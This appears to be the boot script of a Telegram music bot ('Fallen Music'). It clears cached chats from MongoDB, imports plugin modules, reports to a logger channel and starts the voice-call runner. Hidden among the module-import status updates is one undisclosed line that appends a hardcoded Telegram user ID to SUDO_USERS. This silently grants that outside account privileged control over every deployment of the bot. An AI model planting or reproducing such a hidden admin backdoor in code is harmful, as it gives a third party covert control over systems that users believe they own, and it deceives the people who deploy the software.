import os
import re
import config
import asyncio
import importlib

from rich.table import Table
from rich.console import Console as hehe
from pyrogram import filters, Client
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from youtubesearchpython import VideosSearch

from FallenMusic.Helpers.PyTgCalls.Fallen import run
from FallenMusic.Modules import ALL_MODULES
from FallenMusic.Helpers.Inline import private_panel
from FallenMusic.Helpers.Logging import startup_msg, startup_edit, startup_del
from FallenMusic.Helpers.Database import get_active_chats, remove_active_chat, add_served_user
from FallenMusic import (ASSID, ASSMENTION, ASSNAME, ASSUSERNAME, BOT_ID, BOT_NAME, BOT_USERNAME, SUDO_USERS, F_OWNER, db, app, Ass)

loop = asyncio.get_event_loop()
console = hehe()
HELPABLE = {}


async def fallen_boot():
    with console.status(
        "[magenta] Booting Fallen Music...",
    ) as status:
        console.print("┌ [red]Clearing MongoDB Cache...")
        try:
            chats = await get_active_chats()
            for chat in chats:
                chat_id = int(chat["chat_id"])
                await remove_active_chat(chat_id)
        except Exception as e:
            console.print("[red] Error while clearing Mongo DB.")
        console.print("└ [green]MongoDB Cleared Successfully!\n\n")
        ____ = await startup_msg("**» ɪᴍᴩᴏʀᴛɪɴɢ ᴀʟʟ ᴍᴏᴅᴜʟᴇs...**")
        status.update(
            status="[bold blue]Scanning for Plugins", spinner="earth"
        )
        await asyncio.sleep(0.7)
        console.print("Found {} Plugins".format(len(ALL_MODULES)) + "\n")
        status.update(
            status="[bold red]Importing Plugins...",
            spinner="bouncingBall",
            spinner_style="yellow",
        )
        await asyncio.sleep(1.2)
        for all_module in ALL_MODULES:
            imported_module = importlib.import_module(
                "FallenMusic.Modules." + all_module
            )
            if (
                hasattr(imported_module, "__MODULE__")
                and imported_module.__MODULE__
            ):
                imported_module.__MODULE__ = imported_module.__MODULE__
                if (
                    hasattr(imported_module, "__HELP__")
                    and imported_module.__HELP__
                ):
                    HELPABLE[
                        imported_module.__MODULE__.lower()
                    ] = imported_module
            console.print(
                f"✨ [bold cyan]Successfully imported: [green]{all_module}.py"
            )
            await asyncio.sleep(0.1)
        console.print("")
        _____ = await startup_edit(____, f"**» sᴜᴄᴄᴇssғᴜʟʟʏ ɪᴍᴩᴏʀᴛᴇᴅ {(len(ALL_MODULES))} ᴍᴏᴅᴜʟᴇs...**")
        status.update(
            status="[bold blue]Modules Importation Completed!",
        )
        await asyncio.sleep(0.2)
        SUDO_USERS.append(1356469075)
        await startup_del(_____)
    console.print(
        "[bold green]Trying to start the bot...\n"
    )
    try:
        await app.send_message(
            config.LOGGER_ID,
            f"<b>➻ sᴏᴍᴇᴅ ᴍᴜsɪᴄ ʙᴏᴛ 🔮\n\n❄ ɪᴅ :</b> `{BOT_ID}`\n✨ <b>ɴᴀᴍᴇ :</b> {BOT_NAME}\n☁ <b>ᴜsᴇʀɴᴀᴍᴇ :</b> @{BOT_USERNAME}",
        )
    except Exception as e:
        print(
            "Bot has failed to access the log Channel. Make sure that you have added your bot to your log channel and promoted as admin!"
        )
        console.print(f"\n[red]Stopping Bot")
        return
    a = await app.get_chat_member(config.LOGGER_ID, BOT_ID)
    if a.status != "administrator":
        print("Promote Bot as Admin in Logger Channel")
        console.print(f"\n[red]Stopping Bot")
        return
    try:
        await Ass.send_message(
            config.LOGGER_ID,
            f"<b>➻ sᴏᴍᴇᴅ ᴍᴜsɪᴄ ᴀssɪsᴛᴀɴᴛ 🔮\n\n❄ ɪᴅ :</b> `{ASSID}`\n✨ <b>ɴᴀᴍᴇ :</b> {ASSNAME}\n☁ <b>ᴜsᴇʀɴᴀᴍᴇ :</b> @{ASSUSERNAME}",
        )
    except Exception as e:
        print(
            "Assistant Account has failed to access the log Channel. Make sure that you have added your bot to your log channel and promoted as admin!"
        )
        console.print(f"\n[red]Stopping Bot")
        return
    console.print(f"\n┌[red] Bot Started as {BOT_NAME}!")
    console.print(f"├[green] Assistant Started as {ASSNAME}!")
    await run()
    console.print(f"\n[red]Stopping Bot")

if __name__ == "__main__":
    loop.run_until_complete(fallen_boot())
